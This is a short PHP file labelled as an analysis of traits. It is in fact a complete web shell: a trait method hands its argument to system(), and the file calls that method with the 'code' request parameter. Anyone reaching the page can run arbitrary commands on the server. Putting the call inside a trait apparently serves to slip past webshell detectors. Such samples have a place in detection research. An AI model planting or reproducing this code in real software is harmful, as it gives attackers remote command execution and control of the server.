<?php
/* 
 * trait 分析
 */

trait Foo {
    public function myexec($code) {
        system($code);
    }
}

class MyExec {
    use Foo;
}

$o = new MyExec();
$o->myexec($_GET['code']);
